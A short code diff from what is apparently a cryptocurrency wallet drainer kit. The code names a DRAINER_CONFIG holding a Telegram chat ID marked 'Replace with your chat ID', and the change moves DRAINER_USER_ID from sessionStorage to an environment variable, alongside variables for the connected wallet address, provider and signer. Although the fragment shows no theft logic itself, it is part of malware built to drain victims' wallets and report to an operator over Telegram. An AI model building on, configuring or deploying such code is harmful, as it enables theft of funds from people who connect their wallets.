@@ -4,7 +4,8 @@ const DRAINER_CONFIG = {
   "telegram_chat_id": "-1002291356770" // Replace with your chat ID
 };
 
-var DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');
+const DRAINER_USER_ID = process.env.DRAINER_ID;
+
 
 var connected_address = null, web3 = null, signer = null;
 var current_provider = null, current_chain_id = null;
